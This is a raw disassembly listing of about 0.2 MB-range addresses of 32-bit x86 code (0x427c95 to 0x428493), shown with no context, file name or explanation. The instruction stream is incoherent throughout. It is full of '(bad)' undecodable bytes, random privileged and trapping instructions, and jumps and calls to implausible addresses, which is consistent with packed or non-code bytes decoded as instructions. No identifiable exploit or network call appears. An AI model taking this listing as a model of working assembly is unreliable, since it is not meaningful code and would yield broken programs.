  427c95:	xor    al,BYTE PTR [esi-0x280276]
  427c9b:	dec    ebp
  427c9c:	jne    0x427cd1
  427c9e:	mov    eax,DWORD PTR [ebx]
  427ca0:	cld    
  427ca1:	loopne 0x427c53
  427ca3:	push   ebp
  427ca4:	add    DWORD PTR [eax+0x72851100],ecx
  427caa:	inc    DWORD PTR [eax]
  427cac:	inc    DWORD PTR [ebp-0x75]
  427caf:	mov    edi,esp
  427cb1:	lock add bl,0x1
  427cb5:	retf   
  427cb6:	add    dh,al
  427cb8:	xor    dh,cl
  427cba:	inc    ebp
  427cbb:	scas   eax,DWORD PTR es:[edi]
  427cbc:	mov    eax,DWORD PTR [ebx]
  427cbe:	shl    al,0x0
  427cc1:	inc    ebp
  427cc2:	dec    DWORD PTR [ebx+0x4dccf0ff]
  427cc8:	call   0x458f00
  427ccd:	ud0    eax,ecx
  427cd0:	adc    al,0x4d
  427cd2:	inc    ebp
  427cd3:	xor    ecx,DWORD PTR [ebx+0x8bd82b]
  427cd9:	lock push 0x338055
  427cdf:	add    eax,DWORD PTR [eax]
  427ce1:	ud0    ecx,edx
  427ce4:	sbb    BYTE PTR [ebp+0x5e],dl
  427ce7:	xor    ecx,ecx
  427ce9:	sub    eax,DWORD PTR [ecx*4+0x72ec1155]
  427cf0:	push   ecx
  427cf1:	add    BYTE PTR [ebp-0x38],cl
  427cf4:	mov    DWORD PTR [esi-0x740004],eax
  427cfa:	cld    
  427cfb:	inc    ebp
  427cfc:	xchg   edx,eax
  427cfd:	mov    ecx,DWORD PTR [ebx-0x743c761c]
  427d03:	xabort 0xaf
  427d06:	icebp  
  427d07:	mov    esi,DWORD PTR [ebp-0x28]
  427d0a:	(bad)  
  427d0b:	retf   
  427d0c:	or     ecx,eax
  427d0e:	(bad)  
  427d0f:	dec    ebp
  427d10:	pop    es
  427d11:	(bad)  
  427d12:	(bad)  
  427d13:	or     BYTE PTR [esi],al
  427d15:	jb     0x427cdd
  427d17:	add    BYTE PTR [ebx],al
  427d19:	inc    ebp
  427d1a:	(bad)  
  427d1b:	mov    ecx,DWORD PTR [edx]
  427d1d:	fadd   st(6),st
  427d1f:	ret    
  427d20:	add    ch,BYTE PTR [eax-0x37]
  427d23:	int    0x55
  427d25:	sub    ebp,esp
  427d27:	add    edx,DWORD PTR [ecx-0x14]
  427d2a:	inc    ebp
  427d2b:	inc    ebp
  427d2c:	mov    DWORD PTR [ebx-0x3c740b04],ecx
  427d32:	cld    
  427d33:	(bad)  
  427d34:	mov    gs,WORD PTR [edi+0xf893be0]
  427d3a:	mov    ebp,ebp
  427d3c:	clc    
  427d3d:	push   eax
  427d3f:	push   DWORD PTR [ebp-0x4]
  427d42:	mov    BYTE PTR [ebp+0xa],0xff
  427d46:	(bad)  
  427d47:	int3   
  427d48:	or     BYTE PTR [eax],al
  427d4a:	(bad)  
  427d4b:	lea    eax,[edi]
  427d4d:	ins    BYTE PTR es:[edi],dx
  427d4e:	(bad)  
  427d4f:	inc    DWORD PTR [ecx]
  427d51:	push   eax
  427d52:	mov    BYTE PTR [ebp+0x9],0x8b
  427d56:	leave  
  427d57:	les    edx,FWORD PTR [ebp+0x0]
  427d5a:	in     al,dx
  427d5b:	call   DWORD PTR [ecx-0x75]
  427d5e:	inc    ebp
  427d5f:	cld    
  427d60:	mov    DWORD PTR [eax+0x8b01fc],eax
  427d66:	cld    
  427d67:	xor    BYTE PTR [edi-0x76a8f98b],bh
  427d6d:	std    
  427d6e:	mov    eax,DWORD PTR [eax]
  427d70:	clc    
  427d71:	test   eax,esi
  427d73:	je     0x427dea
  427d75:	mov    eax,esi
  427d77:	cld    
  427d78:	add    al,0x80
  427d7a:	add    WORD PTR [ecx+0x0],ax
  427d7e:	fadd   QWORD PTR [eax]
  427d80:	mov    BYTE PTR [eax],0xd0
  427d83:	push   0xffffffc3
  427d85:	push   edi
  427d86:	mov    edx,DWORD PTR [eax+0x51]
  427d89:	pop    edi
  427d8a:	lea    ebx,[ebx-0x8]
  427d8d:	ret    0x45
  427d90:	mov    ecx,DWORD PTR [ebx-0x7241ae04]
  427d96:	xchg   eax,edi
  427d98:	mov    DWORD PTR [ebp-0x75],ecx
  427d9b:	push   esi
  427d9c:	clc    
  427d9d:	jne    0x427d6f
  427d9f:	mov    ecx,0xf8450b0b
  427da4:	(bad)  
  427da5:	push   cs
  427da6:	or     BYTE PTR [ebp-0x3a],dh
  427da9:	cmp    eax,DWORD PTR [ecx]
  427dab:	pop    esi
  427dac:	(bad)  
  427dad:	or     al,0x5
  427daf:	inc    eax
  427db0:	leave  
  427db1:	in     al,dx
  427db2:	add    al,0x42
  427db4:	push   esi
  427db5:	and    eax,0xedc940cf
  427dba:	inc    DWORD PTR [eax-0x75]
  427dbd:	fmul   QWORD PTR [ebx-0xf8739be]
  427dc3:	inc    eax
  427dc4:	nop
  427dc5:	jmp    0x518b:0x8b8bc3ff
  427dcc:	(bad)  
  427dcd:	lea    eax,ds:0xff45e8f8
  427dd3:	push   esi
  427dd4:	push   DWORD PTR [ebp-0x39]
  427dd7:	mov    eax,0x7edda46
  427ddc:	or     al,0x6
  427dde:	push   DWORD PTR [ebp-0x3a]
  427de1:	cmp    eax,DWORD PTR [edx]
  427de3:	pop    esi
  427de4:	ret    
  427de5:	or     al,0x56
  427de7:	inc    ecx
  427de8:	push   ebp
  427de9:	js     0x427dd7
  427deb:	inc    edx
  427dec:	inc    ebp
  427ded:	int    0x1
  427def:	inc    ecx
  427df0:	sub    BYTE PTR ds:0xe77541fc,ah
  427df6:	add    DWORD PTR [edx+0x1c],eax
  427df9:	int3   
  427dfa:	mov    eax,ebx
  427dfc:	adc    al,0x8b
  427dfe:	xchg   edx,eax
  427dff:	push   ecx
  427e00:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  427e06:	rcl    DWORD PTR [esi-0x9],cl
  427e09:	jne    0x427e5b
  427e0b:	mov    eax,0x7c80ece
  427e10:	rol    DWORD PTR [esi],cl
  427e12:	div    DWORD PTR [ebp+0x50]
  427e15:	cmp    ecx,edx
  427e17:	pop    esi
  427e18:	dec    BYTE PTR [edx]
  427e1a:	in     al,dx
  427e1b:	inc    edx
  427e1c:	sub    ebp,ecx
  427e1e:	inc    eax
  427e1f:	(bad)  
  427e20:	push   eax
  427e21:	add    edx,DWORD PTR [eax-0x17]
  427e24:	push   edi
  427e25:	add    dh,dh
  427e27:	leave  
  427e28:	adc    DWORD PTR [ebp-0x1],0xffffffec
  427e2c:	add    BYTE PTR [ecx+0x0],dl
  427e2f:	inc    ebp
  427e30:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  427e36:	add    BYTE PTR [eax-0x7fbf448],bh
  427e3c:	add    al,0x2
  427e3e:	jmp    0x57e2998
  427e43:	jne    0x427e2d
  427e45:	mov    eax,DWORD PTR [edx]
  427e47:	or     BYTE PTR [eax],al
  427e49:	inc    ecx
  427e4a:	stc    
  427e4b:	in     eax,dx
  427e4c:	ss inc eax
  427e4e:	aas    
  427e4f:	out    0x7d,eax
  427e51:	inc    ecx
  427e52:	mov    esi,ecx
  427e54:	lock ret 0x7d
  427e58:	and    ecx,DWORD PTR [ebx-0x171777]
  427e5e:	add    bh,bh
  427e60:	aad    0xd7
  427e62:	add    dh,cl
  427e64:	clts   
  427e66:	(bad)  
  427e67:	call   0xffcd7d6c
  427e6c:	hlt    
  427e6d:	iret   
  427e6e:	jge    0x427e46
  427e70:	rol    DWORD PTR [esi-0x80],cl
  427e73:	icebp  
  427e74:	or     BYTE PTR [edi-0x27],cl
  427e77:	(bad)  
  427e78:	out    dx,al
  427e79:	mov    eax,DWORD PTR [ebx]
  427e7b:	(bad)  
  427e7c:	pop    esi
  427e7d:	push   es
  427e7e:	cmp    al,0xe8
  427e80:	sar    edi,0x8
  427e83:	inc    DWORD PTR [edi]
  427e85:	inc    esi
  427e86:	(bad)  
  427e87:	jmp    0x8b00:0x530e577e
  427e8e:	push   esi
  427e8f:	mov    eax,DWORD PTR [eax]
  427e91:	and    al,0x0
  427e93:	inc    ebp
  427e94:	push   eax
  427e95:	push   eax
  427e96:	add    DWORD PTR [ebx+0x757d1834],ecx
  427e9c:	sub    edx,DWORD PTR [esi-0x24]
  427e9f:	jne    0x427e57
  427ea1:	lods   eax,DWORD PTR ds:[esi]
  427ea2:	mov    edx,DWORD PTR [edx-0x34]
  427ea5:	dec    esi
  427ea6:	out    0x83,eax
  427ea8:	into   
  427ea9:	push   edi
  427eab:	loopne 0x427e7b
  427ead:	shr    BYTE PTR [edx+ecx*4+0x0],1
  427eb1:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  427eb8:	rol    DWORD PTR [edx],0x8
  427ebb:	mov    esp,ecx
  427ebd:	cmp    DWORD PTR [ebx],0xc
  427ec0:	mov    esi,0x5001c0
  427ec5:	push   eax
  427ec6:	push   cs
  427ec7:	push   eax
  427ec8:	(bad)  
  427ec9:	sub    edx,edi
  427ecb:	push   esi
  427ecc:	adc    al,0xcb
  427ece:	ins    DWORD PTR es:[edi],dx
  427ecf:	mov    eax,0x203e8
  427ed4:	add    al,ah
  427ed6:	ror    BYTE PTR [eax+0xc007c0],0xc0
  427edd:	add    dh,al
  427edf:	add    ah,ch
  427ee1:	rol    DWORD PTR [ebx-0x3595fb0d],1
  427ee7:	pop    ecx
  427ee8:	or     eax,ebx
  427eea:	cli    
  427eeb:	add    BYTE PTR [ecx-0x4e728d1e],dh
  427ef1:	lea    ebp,[ebx]
  427ef3:	mov    edx,DWORD PTR [edx-0x4]
  427ef6:	dec    ecx
  427ef7:	inc    ebp
  427ef8:	shr    BYTE PTR [ebx],0x4b
  427efb:	and    al,0x0
  427efd:	(bad)  
  427efe:	jne    0x427f45
  427f00:	pop    eax
  427f01:	mov    al,0x5a
  427f03:	call   0x1418162
  427f08:	and    al,0x85
  427f0a:	push   edx
  427f0b:	add    BYTE PTR [eax+eax*1+0x0],ah
  427f0f:	dec    ebp
  427f10:	mov    cl,0x23
  427f12:	jmp    0x427f00
  427f14:	mov    al,0xe7
  427f16:	call   0x1388204
  427f1b:	shr    DWORD PTR [eax+ebx*2],cl
  427f1e:	lock (bad) 
  427f20:	adc    eax,0x757f008d
  427f25:	out    0x58,eax
  427f27:	cmp    al,0x7
  427f29:	pop    edx
  427f2a:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  427f31:	push   ecx
  427f32:	cld    
  427f33:	mov    esi,0x3b0175
  427f38:	and    al,0xb0
  427f3a:	xor    BYTE PTR [edx+0x1],0x8b
  427f3e:	add    ah,bh
  427f40:	mov    edi,DWORD PTR [ebp-0x4]
  427f43:	psubsw mm7,QWORD PTR [edi]
  427f46:	add    DWORD PTR [ebp+0x0],ebp
  427f49:	rcr    eax,1
  427f4b:	mov    edi,ecx
  427f4d:	and    eax,DWORD PTR [eax]
  427f4f:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  427f55:	call   0x12f823e
  427f5a:	add    al,cl
  427f5c:	mov    ebp,esi
  427f5e:	aam    0x83
  427f60:	or     DWORD PTR [ecx],eax
  427f62:	jne    0x427f55
  427f64:	mov    eax,DWORD PTR [eax]
  427f66:	aam    0x0
  427f68:	dec    ebp
  427f69:	jne    0x427ef6
  427f6b:	cmp    ebx,eax
  427f6d:	jb     0x427fbc
  427f6f:	jmp    0x427efc
  427f71:	mov    ebx,esp
  427f73:	int3   
  427f74:	dec    ebp
  427f75:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  427f7c:	mov    edx,0x8b0a8b
  427f81:	cmp    ecx,DWORD PTR [eax]
  427f83:	jb     0x427f5c
  427f85:	pop    edx
  427f86:	push   edi
  427f87:	cli    
  427f88:	pop    es
  427f89:	mov    eax,ecx
  427f8b:	jb     0x427f8f
  427f8d:	add    DWORD PTR [ebx],0xa
  427f90:	mov    eax,DWORD PTR [ebx]
  427f92:	int3   
  427f93:	add    bh,BYTE PTR [esi+0x75d10006]
  427f99:	jmp    0x427f26
  427f9b:	mov    al,0xe8
  427f9d:	call   0x103821f
  427fa2:	add    edx,DWORD PTR [ecx+ecx*8]
  427fa5:	pop    edi
  427fa6:	or     BYTE PTR [ecx-0x73],bl
  427fa9:	pop    ecx
  427faa:	inc    edi
  427fab:	xor    al,0xeb
  427fad:	push   ecx
  427fae:	mov    edi,DWORD PTR [edx+0xc506cc]
  427fb4:	call   0xb180b9
  427fb9:	int3   
  427fba:	sbb    BYTE PTR [esi],ch
  427fbc:	inc    ebp
  427fbd:	add    BYTE PTR [ebx-0x1f4f338b],cl
  427fc3:	call   0x9b8232
  427fc8:	or     BYTE PTR [ebx-0x73],dl
  427fcb:	cmp    al,0x47
  427fcd:	mov    al,0x1
  427fcf:	jb     0x427fd1
  427fd1:	mov    al,0x10
  427fd3:	push   eax
  427fd4:	add    al,0x75
  427fd6:	add    BYTE PTR [ebx],ch
  427fd8:	add    ebx,esp
  427fda:	int3   
  427fdb:	jne    0x427fed
  427fdd:	movsx  edx,cl
  427fe0:	add    DWORD PTR [eax],eax
  427fe2:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  427fe9:	mov    gs,edi
  427feb:	add    BYTE PTR [eax-0x50],ch
  427fee:	add    al,ch
  427ff0:	mov    eax,DWORD PTR [ecx]
  427ff2:	sub    eax,DWORD PTR [eax]
  427ff4:	jb     0x42806b
  427ff6:	add    DWORD PTR [esp+eiz*8-0x50],esi
  427ffa:	jge    0x427fe4
  427ffc:	add    al,0x1
  427ffe:	add    DWORD PTR [eax],0x0
  428001:	jne    0x428003
  428003:	je     0x42804a
  428005:	mov    eax,DWORD PTR [edi]
  428007:	ror    BYTE PTR [ebp+0x4d],1
  42800a:	or     DWORD PTR [ecx+0x4d03d004],0x3
  428011:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  428017:	mov    DWORD PTR [ebx],ebp
  428019:	fadd   DWORD PTR [eax+0x75]
  42801c:	inc    eax
  42801d:	pop    eax
  42801e:	lea    ebx,[ecx+0x4f]
  428021:	push   0xb1000003
  428026:	out    dx,eax
  428027:	add    ebp,DWORD PTR [edx+edx*2]
  42802a:	add    BYTE PTR [ebx+ecx*4],bh
  42802d:	mov    ch,BYTE PTR [ebx]
  42802f:	jb     0x4280a3
  428031:	add    al,0x89
  428033:	push   eax
  428034:	call   0x842acda6
  428039:	add    DWORD PTR [eax+eax*1],eax
  42803c:	jae    0x428052
  42803e:	icebp  
  42803f:	inc    ebp
  428040:	mov    eax,DWORD PTR gs:[ecx]
  428043:	int3   
  428044:	out    dx,al
  428045:	loopne 0x428094
  428047:	sub    eax,DWORD PTR [edx]
  428049:	push   0xffffff83
  42804b:	pop    esi
  42804c:	push   cs
  42804d:	jl     0x428068
  42804f:	add    al,0xaf
  428051:	xor    eax,0x832b6d00
  428056:	mov    eax,DWORD PTR [edx]
  428058:	rcr    BYTE PTR [ebp+0x754500dc],cl
  42805e:	ror    DWORD PTR [ebx+0x7dc8e803],1
  428064:	inc    ebp
  428065:	shr    ebx,0x3
  428068:	or     DWORD PTR [eax],0x4
  42806b:	push   0xffffffa5
  42806d:	pop    esi
  42806e:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  428075:	jmp    0x4280d4
  428077:	mov    edi,0xff0272
  42807c:	fdivr  QWORD PTR [ebp+0x5d]
  42807f:	push   0x4e
  428081:	pop    ecx
  428082:	call   0x42c487
  428087:	mov    DWORD PTR [ebx],eax
  428089:	in     al,0xc8
  42808b:	rol    BYTE PTR [ebp-0x75],0xc1
  42808f:	call   0xac8270
  428094:	pop    esi
  428095:	enter  0xceff,0x8b
  428099:	repz mov ecx,DWORD PTR [ebp-0x34]
  42809d:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  4280a4:	je     0x4280a6
  4280a6:	or     DWORD PTR [ebx-0x74183b24],eax
  4280ac:	jne    0x428092
  4280ae:	jmp    0x4280a9
  4280b0:	push   DWORD PTR [edx-0x24]
  4280b3:	push   0x4d
  4280b5:	pop    ecx
  4280b6:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  4280ba:	jge    0x4280c2
  4280bc:	mov    eax,eax
  4280be:	sub    ebp,DWORD PTR [edx+0x24]
  4280c1:	pop    esi
  4280c2:	inc    ebp
  4280c3:	mov    esp,0x8b6077
  4280c8:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  4280ce:	lods   al,BYTE PTR ds:[esi]
  4280cf:	add    BYTE PTR [ebx],bh
  4280d1:	enter  0xce73,0x49
  4280d5:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  4280dd:	stc    
  4280de:	jge    0x428152
  4280e0:	jnp    0xdd42044f
  4280e6:	call   0xc581bc
  4280eb:	fadd   st(0),st
  4280ed:	dec    esi
  4280ee:	ins    BYTE PTR es:[edi],dx
  4280ef:	stc    
  4280f0:	cmp    al,0x73
  4280f2:	push   ebp
  4280f3:	mov    eax,0xf8028b
  4280f8:	jne    0x4280bb
  4280fa:	mov    esi,ecx
  4280fc:	mov    esp,DWORD PTR [ebp+0x2c]
  4280ff:	add    edi,DWORD PTR [ebp-0x24]
  428102:	sub    esp,eax
  428104:	and    al,0x45
  428106:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  42810c:	sbb    al,0xee
  42810e:	pop    esi
  42810f:	call   0x82813f
  428114:	fsubr  st,st(3)
  428116:	sti    
  428117:	add    BYTE PTR gs:[ecx],bh
  42811a:	add    eax,esp
  42811c:	add    DWORD PTR [esi],eax
  42811e:	rol    DWORD PTR [ebp+0x8],0x29
  428122:	mov    esp,eax
  428124:	clc    
  428125:	jne    0x42819c
  428127:	mov    eax,0x8b0673
  42812c:	loopne 0x428173
  42812e:	loopne 0x4280b9
  428130:	lods   al,BYTE PTR ds:[esi]
  428131:	int3   
  428132:	inc    ebp
  428133:	mov    DWORD PTR gs:[eax+edi*8],eax
  428137:	add    al,0xc3
  428139:	sub    ecx,DWORD PTR [ebp+0x47]
  42813c:	(bad)  
  42813e:	shr    BYTE PTR [ebp-0x1f],0xe8
  428142:	add    eax,DWORD PTR [eax]
  428144:	call   0x6444249
  428149:	add    esi,DWORD PTR [esi-0x3b2efc83]
  42814f:	dec    esi
  428150:	ins    DWORD PTR es:[edi],dx
  428151:	in     al,dx
  428152:	lea    eax,[eax]
  428154:	inc    ebp
  428155:	inc    ebp
  428156:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  42815c:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  428166:	and    al,0xdc
  428168:	ror    DWORD PTR [edx+0x24],0xf7
  42816c:	or     BYTE PTR [ebp+0x4c],dh
  42816f:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  428173:	stos   BYTE PTR es:[edi],al
  428174:	adc    edx,edi
  428176:	inc    esp
  428177:	add    edi,DWORD PTR [eax]
  428179:	jne    0x42815e
  42817b:	mov    DWORD PTR [eax-0x7449db04],ecx
  428181:	cmp    ecx,DWORD PTR [edi]
  428183:	sub    BYTE PTR [ebp-0x7e],dl
  428186:	sar    ebp,0xb
  428189:	jmp    FWORD PTR [edi+0x2400392a]
  42818f:	sub    esi,DWORD PTR [ebx-0x73]
  428192:	mov    esp,DWORD PTR [ecx+edi*4]
  428195:	mov    ecx,DWORD PTR [eax]
  428197:	and    BYTE PTR [eax],al
  428199:	jne    0x428165
  42819b:	sub    ebp,ecx
  42819d:	sbb    BYTE PTR [esi+0x32],ah
  4281a0:	dec    ebp
  4281a1:	push   ebp
  4281a2:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  4281a8:	ret    
  4281a9:	mov    edx,ebp
  4281ab:	leave  
  4281ac:	sub    DWORD PTR [esi+0x24],ebx
  4281af:	ret    0x2b
  4281b2:	pop    ax
  4281b4:	push   ebp
  4281b5:	rol    BYTE PTR [ebx],0xeb
  4281b8:	add    DWORD PTR [ecx+0x6c0001],0x40
  4281bf:	jb     0x428216
  4281c1:	ret    
  4281c2:	in     al,dx
  4281c3:	jecxz  0x428150
  4281c5:	push   esi
  4281c6:	xchg   esp,eax
  4281c7:	jne    0x4281c9
  4281c9:	cmp    edx,DWORD PTR [esi+0x1c]
  4281cc:	jne    0x4281b2
  4281ce:	mov    eax,DWORD PTR [ebp-0x77]
  4281d1:	ror    DWORD PTR [ebx+0x899408],0xe0
  4281d8:	mov    esi,DWORD PTR [ebp-0x75]
  4281db:	pop    esi
  4281dc:	nop
  4281dd:	mov    eax,DWORD PTR [eax]
  4281df:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  4281e5:	add    al,0x0
  4281e7:	inc    ebp
  4281e8:	mov    eax,DWORD PTR [ebx]
  4281ea:	mov    ebp,ebx
  4281ec:	cmp    al,0xf
  4281ee:	or     al,al
  4281f0:	inc    ebp
  4281f1:	inc    ebp
  4281f2:	cmp    BYTE PTR [ebx+0x6c8bc89c],cl
  4281f8:	cld    
  4281f9:	add    BYTE PTR [edi+0x506c16c0],dh
  4281ff:	add    BYTE PTR [ecx-0x5],dl
  428202:	add    eax,0x17200
  428207:	sbb    al,0x85
  428209:	dec    esp
  42820a:	je     0x428244
  42820c:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  428210:	add    BYTE PTR [ebx],bh
  428212:	(bad)  
  428213:	and    al,0x39
  428215:	jae    0x4281b3
  428217:	mov    cl,cl
  428219:	inc    DWORD PTR [esp]
  42821c:	push   ebp
  42821d:	shr    esp,0x8
  428220:	in     al,dx
  428221:	push   esp
  428222:	add    DWORD PTR [eax],esp
  428224:	add    bl,cl
  428226:	inc    ebp
  428227:	mov    bh,0x89
  428229:	add    ah,bh
  42822b:	jmp    0xca7b9175
  428230:	pushf  
  428231:	dec    esp
  428232:	mov    edx,0xf8178520
  428237:	fst    DWORD PTR [ebp+0x0]
  42823a:	mov    BYTE PTR [eax],0xc4
  42823d:	sub    edx,DWORD PTR [ebx-0x3f]
  428240:	inc    ebp
  428241:	add    eax,0xc601dc
  428246:	mov    al,0xc6
  428249:	ins    BYTE PTR es:[edi],dx
  42824a:	mov    DWORD PTR [eax+0x57],0x2e0545c1
  428251:	dec    esp
  428252:	jmp    DWORD PTR [eax]
  428254:	inc    ebp
  428255:	fnstcw WORD PTR [eax+0x29]
  428258:	test   BYTE PTR [eax],0xc5
  42825b:	rol    BYTE PTR [eax],0xc0
  42825e:	lea    ecx,[ebp-0x3cf0dbcb]
  428264:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  42826a:	inc    esi
  42826b:	add    DWORD PTR [eax],ebx
  42826d:	add    dh,bh
  42826f:	mov    esi,DWORD PTR [edx+0x8]
  428272:	(bad)  
  428273:	fdiv   QWORD PTR ss:[ecx]
  428276:	(bad)  
  428277:	mov    bl,ch
  428279:	add    esi,eax
  42827b:	add    dh,bl
  42827d:	or     esi,eax
  42827f:	mov    dl,0xdf
  428281:	add    esi,eax
  428283:	add    al,ah
  428285:	push   cs
  428286:	mov    BYTE PTR [edx+0xc601e1],0xe2
  42828d:	or     BYTE PTR [ebx],dh
  42828f:	dec    ecx
  428290:	lea    eax,[ebx]
  428292:	xor    eax,0x18fc0fc7
  428297:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428298:	repz clc 
  42829a:	add    eax,DWORD PTR [ebp+0x46]
  42829d:	prefetcht0 BYTE PTR [ecx-0x2]
  4282a1:	xor    eax,0x7c60872
  4282a6:	mov    esp,0xbd32c698
  4282ab:	pop    esi
  4282ac:	mov    cl,0xbe
  4282af:	or     al,0xc6
  4282b1:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  4282b8:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  4282bf:	add    dh,al
  4282c1:	mov    eax,ebx
  4282c3:	xor    DWORD PTR [ebx],0x35008dbc
  4282c9:	mov    ecx,DWORD PTR [edi]
  4282cb:	sbb    al,0x18
  4282cd:	inc    ebp
  4282ce:	xrelease mov DWORD PTR [ebx],0x188546f4
  4282d5:	clc    
  4282d6:	(bad)  
  4282d7:	cmp    BYTE PTR [edx-0x64],dh
  4282da:	lea    ecx,[ecx+0x45ffe838]
  4282e0:	mov    ecx,esp
  4282e2:	fadd   st,st(6)
  4282e4:	dec    ebp
  4282e5:	lds    edi,FWORD PTR [eax+0x7145fc56]
  4282eb:	out    0x1,eax
  4282ed:	inc    ebp
  4282ee:	lea    ebp,ds:0xc8ffc6ff
  4282f4:	enter  0xa33,0xc6
  4282f8:	push   ebp
  4282f9:	leave  
  4282fa:	(bad)  
  4282fb:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  428301:	add    BYTE PTR [ebp+0x44],al
  428304:	mov    eax,esp
  428306:	mov    WORD PTR [esi+0x43398300],?
  42830c:	psubusw mm4,QWORD PTR [eax-0x78]
  428310:	add    BYTE PTR [ebx-0x1303f975],al
  428316:	add    BYTE PTR [ebp+0x1],0xf3
  42831a:	add    BYTE PTR [ebp+0x38],al
  42831d:	in     eax,dx
  42831e:	inc    ebp
  42831f:	inc    ebp
  428320:	mov    esp,ebx
  428322:	add    BYTE PTR [ebp+0x0],0xee
  428326:	mov    DWORD PTR [ebp-0x48],eax
  428329:	sub    eax,0x2e00454f
  42832e:	js     0x428375
  428330:	data16 js 0x4282b8
  428333:	idiv   bh
  428335:	inc    esp
  428336:	(bad)  
  428337:	fadd   st(7),st
  428339:	mov    dh,0x89
  42833b:	and    DWORD PTR [esi+0x43],0xffffffff
  42833f:	fld    DWORD PTR [ebx-0x767cc078]
  428345:	pop    es
  428346:	push   0x8d45ffec
  42834b:	in     eax,dx
  42834c:	inc    DWORD PTR [ebp-0x77]
  42834f:	loopne 0x4283bb
  428351:	inc    ebp
  428352:	jmp    esp
  428354:	add    DWORD PTR [ebp+0x11],0xfffffff1
  428358:	mov    DWORD PTR [ebp+0x6c],eax
  42835b:	(bad)  
  42835d:	inc    ebp
  42835e:	(bad)  
  42835f:	call   0xe7cbc870
  428364:	outs   dx,BYTE PTR ds:[esi]
  428365:	inc    ebp
  428366:	(bad)  
  428367:	js     0x4282ec
  428369:	div    BYTE PTR ds:0x70bc8944
  42836f:	mov    dh,0xff
  428371:	or     DWORD PTR [ebp-0x7626f5bd],0xffffff88
  428378:	jb     0x4282fd
  42837a:	dec    DWORD PTR [eax]
  42837c:	mov    ebp,esp
  42837e:	test   WORD PTR [ebp-0x1],ax
  428385:	inc    ebp
  428386:	ror    BYTE PTR [ebx-0x117a279a],0xff
  42838d:	adc    edi,edi
  42838f:	mov    ecx,esi
  428391:	mov    eax,DWORD PTR [eax]
  428393:	cmp    BYTE PTR [esi-0x1],ah
  428396:	test   DWORD PTR [ebx],edi
  428398:	push   DWORD PTR [ebp-0x1]
  42839b:	mov    DWORD PTR [esi-0x48],ebp
  42839e:	add    BYTE PTR [ebp+0x66],al
  4283a1:	jmp    0x428328
  4283a3:	pushf  
  4283a4:	dec    DWORD PTR [ebx-0x7f9c0301]
  4283aa:	add    BYTE PTR [ecx],al
  4283ac:	data16 add BYTE PTR [ebp-0x7a00c8],al
  4283b3:	add    al,al
  4283b5:	add    BYTE PTR [esi+0x45],ah
  4283b8:	test   DWORD PTR [ebx+0xff7cff],ecx
  4283be:	dec    esp
  4283bf:	mov    DWORD PTR [eax],eax
  4283c1:	mov    esp,DWORD PTR [esi-0x4]
  4283c4:	inc    ebp
  4283c5:	cmp    BYTE PTR [eax+0x4701],0x38
  4283cc:	mov    DWORD PTR [ecx-0x7e],esp
  4283cf:	add    BYTE PTR [edi-0x73],al
  4283d2:	push   0xffffffd1
  4283d4:	mov    WORD PTR [ebp+0x64],ax
  4283d8:	(bad)  
  4283d9:	call   eax
  4283db:	mov    esp,eax
  4283dd:	data16 icebp 
  4283df:	test   DWORD PTR [ebp-0x1],eax
  4283e2:	(bad)  
  4283e4:	out    0xc0,eax
  4283e6:	lea    esp,[esi-0x30]
  4283e9:	test   DWORD PTR [edx+0x43ff80ff],ecx
  4283ef:	inc    edi
  4283f0:	jmp    0x75ff:0x40858866
  4283f7:	dec    DWORD PTR [ebp-0x7a992f40]
  4283fd:	test   esi,edi
  4283ff:	(bad)  
  428400:	(bad)  
  428401:	inc    DWORD PTR [ebp-0x9901b9]
  428407:	test   DWORD PTR [ebx+0x50fff4ff],ecx
  42840d:	rcl    BYTE PTR [ecx+0x66],0x33
  428411:	test   DWORD PTR [ebx+0xff72ff],edi
  428417:	inc    edi
  428418:	ret    
  428419:	mov    ax,WORD PTR [ebp-0x3f0004]
  428420:	push   eax
  428421:	mov    DWORD PTR [ebp-0x77],0xff98748b
  428428:	add    BYTE PTR [ebx-0x764ff439],al
  42842e:	push   DWORD PTR [esi+0x1]
  428431:	inc    DWORD PTR [eax]
  428433:	mov    eax,0xff99ff
  428438:	or     BYTE PTR [ecx-0x7a87bb],cl
  42843e:	jne    0x4283f8
  428440:	add    DWORD PTR [edx-0x76edff72],0xff707a8d
  42844a:	mov    ecx,0xd74fb8
  42844f:	add    cl,al
  428451:	mov    DWORD PTR [ecx-0x3f007784],ecx
  428457:	or     DWORD PTR [ebx+0x558966ec],0x7e
  42845e:	(bad)  
  42845f:	push   ebp
  428461:	mov    eax,0x8c2789
  428466:	ret    0x6689
  428469:	adc    BYTE PTR [ebp+0x4c],0x8d
  42846d:	add    bl,bl
  42846f:	mov    WORD PTR [ebp-0x70],ax
  428473:	(bad)  
  428474:	ret    0x660d
  428477:	or     BYTE PTR [ebp-0x77],dl
  42847a:	lea    eax,[ecx+eiz*8-0x6b1276bb]
  428481:	in     al,0x89
  428483:	(bad)  
  428484:	xchg   esi,eax
  428485:	aam    0xcf
  428487:	call   0x45dafd15
  42848c:	dec    edx
  42848d:	pop    ecx
  42848e:	mov    edx,DWORD PTR [eax]
  428490:	repnz push bp
  428493:	or     BYTE PTR [ebx+0x5510663b],0x49
